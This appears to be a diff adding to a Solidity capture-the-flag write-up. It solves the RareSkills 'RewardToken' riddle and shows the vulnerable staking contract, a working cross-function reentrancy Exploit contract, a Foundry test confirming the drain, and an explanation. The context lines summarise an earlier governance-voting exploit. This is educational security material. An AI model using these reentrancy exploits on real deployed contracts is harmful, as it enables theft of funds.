@@ -972,3 +972,164 @@ In `ExploitMain`, when `exploit` is called, `ExploitViceroyEOA`'s address will b
 In `ExploitViceroyEOA`, we interact with `Goverance` in the constructor only so that our attack gets called on the contract's deployment in `exploit`. The proposal to send funds to `attackerWallet` is created: `abi.encodeWithSignature("exec(address,bytes,uint256)", attackerWallet, "", 10 ether);`, so that when the proposal has enough votes, `executeProposal` will execute a low-level `call` to `CommunityWallet` with the data to call `exec` and send funds to `attackerWallet`. Then in a for loop for 10 voters, we precompute each `ExploitVoterEOA`'s address and call `Governance.approveVoter` to approve each voter. This call will pass since each voter's address is only a precompute so there is no code at the address. Then we deploy each `ExploitVoterEOA` using Create2 with the same salt (`{salt: bytes32(uint256(i))}`) we used to generate `voterPrecomputeAddress`.
 
 While still in the for loop, every time one voter contract is deployed, each `ExploitVoterEOA`'s constructor will contain code to call `Governance.voteOnProposal`, and the proposal will receive 1 vote during each iteration. After the voter contract is deployed, we can simply call `Governance.disapproveVoter(voterPrecomputeAddress)` to exploit the `delete` bug, and allow `ExploitViceroyEOA` to have more than 5 approved voters. By the end of the for loop, the viceroy will have 10 approved voters, and the proposal would have received 10 votes. `ExploitViceroy` then calls `Governance.executeProposal` at the end of the contructor to execute the call to transfer funds to `attackerWallet`.
+
+## RareSkills Solidity Riddles: RewardToken
+Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/RewardToken.sol
+
+### Contracts
+- `src/Week10-11/RewardToken.sol`
+```
+contract RewardToken is ERC20Capped {
+    constructor(address depositoor) ERC20("Token", "TK") ERC20Capped(1000e18) {
+        // becuz capped is funny https://forum.openzeppelin.com/t/erc20capped-immutable-variables-cannot-be-read-during-contract-creation-time/6174/4
+        ERC20._mint(depositoor, 100e18);
+    }
+}
+
+contract NftToStake is ERC721 {
+    constructor(address attacker) ERC721("NFT", "NFT") {
+        _mint(attacker, 42);
+    }
+}
+
+contract Depositoor is IERC721Receiver {
+    IERC721 public nft;
+    IERC20 public rewardToken;
+    uint256 public constant REWARD_RATE = 10e18 / uint256(1 days);
+    bool init;
+
+    constructor(IERC721 _nft) {
+        nft = _nft;
+        alreadyUsed[0] = true;
+    }
+
+    struct Stake {
+        uint256 depositTime;
+        uint256 tokenId;
+    }
+
+    mapping(uint256 => bool) public alreadyUsed;
+    mapping(address => Stake) public stakes;
+
+    function setRewardToken(IERC20 _rewardToken) external {
+        require(!init);
+        init = true;
+        rewardToken = _rewardToken;
+    }
+
+    function onERC721Received(
+        address,
+        address from,
+        uint256 tokenId,
+        bytes calldata
+    )
+        external
+        override
+        returns (bytes4)
+    {
+        require(msg.sender == address(nft), "wrong NFT");
+        require(!alreadyUsed[tokenId], "can only stake once");
+
+        alreadyUsed[tokenId] = true;
+        stakes[from] = Stake({depositTime: block.timestamp, tokenId: tokenId});
+
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    function claimEarnings(uint256 _tokenId) public {
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
+        payout(msg.sender);
+        stakes[msg.sender].depositTime = block.timestamp;
+    }
+
+    function withdrawAndClaimEarnings(uint256 _tokenId) public {
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
+        payout(msg.sender);
+        nft.safeTransferFrom(address(this), msg.sender, _tokenId);
+        delete stakes[msg.sender];
+    }
+
+    function payout(address _a) private {
+        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) * REWARD_RATE;
+
+        if (amountToSend > 50e18) {
+            amountToSend = 50e18;
+        }
+        if (amountToSend > rewardToken.balanceOf(address(this))) {
+            amountToSend = rewardToken.balanceOf(address(this));
+        }
+
+        rewardToken.transfer(_a, amountToSend);
+    }
+}
+
+contract Exploit is IERC721Receiver {
+    Depositoor public depositoor;
+
+    function stakeNFT(uint256 tokenId, NftToStake _nft, Depositoor _depositoor) public {
+        _nft.safeTransferFrom(address(this), address(_depositoor), tokenId);
+    }
+
+    function exploit(uint256 tokenId, Depositoor _depositoor) public {
+        //withdraw NFT calls onERC721Received, which we can use to reenter and attack
+        //since `delete stakes[msg.sender]` is only called after the safeTransferFrom
+        depositoor = _depositoor;
+        depositoor.withdrawAndClaimEarnings(tokenId);
+    }
+
+    function onERC721Received(
+        address,
+        address, /*from*/
+        uint256 tokenId,
+        bytes calldata
+    )
+        external
+        override
+        returns (bytes4)
+    {
+        depositoor.claimEarnings(tokenId);
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
+```
+- `test/Week10-11/RewardToken.t.sol`
+```
+contract RewardTokenTest is Test {
+    address attackerWallet;
+    RewardToken rewardTokenContract;
+    NftToStake nftToStakeContract;
+    Depositoor depositoorContract;
+    Exploit exploitContract;
+
+    function setUp() public {
+        attackerWallet = address(0xbad);
+        exploitContract = new Exploit();
+        nftToStakeContract = new NftToStake(address(exploitContract));
+        depositoorContract = new Depositoor(nftToStakeContract);
+        rewardTokenContract = new RewardToken(address(depositoorContract));
+
+        depositoorContract.setRewardToken(rewardTokenContract);
+    }
+
+    function testExploit() public {
+        vm.startPrank(attackerWallet);
+        exploitContract.stakeNFT(42, nftToStakeContract, depositoorContract);
+
+        //forward 10 days so in `payout` rewards is 100 ether
+        vm.warp(10 days);
+        exploitContract.exploit(42, depositoorContract);
+
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertEq(rewardTokenContract.balanceOf(address(exploitContract)), 100 ether);
+        assertEq(rewardTokenContract.balanceOf(address(depositoorContract)), 0);
+    }
+}
+```
+
+### Exploit
+The vulnerability is in the `withdrawAndClaimEarnings` function, where `delete stakes[msg.sender]` is executed only after the NFT `safeTransferFrom`. When `Exploit` stakes into `Depositoor` and then calls `withdrawAndClaimEarnings`, a `safeTransferFrom` will be called and the `onERC721Received` hook in `Exploit` will be called. Since `delete stakes[msg.sender]` hasn't been executed when control has been handed over to `Exploit`, `Exploit` can reenter `Depositoor` and call `claimEarnings` as its stake will still be present in the `stakes` mapping.
+
+`Depositoor` prevents anyone from claiming more than half the supply in the contract, which means the maximum claimable is only 50 ether. So for the exploit to work, after calling `Exploit.stakeNFT`, we wait for 10 days so that the amount owed is techinically 100 ether. And when we call `Exploit.exploit` the cross-function reentracy will allow `Exploit` to claim twice, effectively draining `Depositoor`.
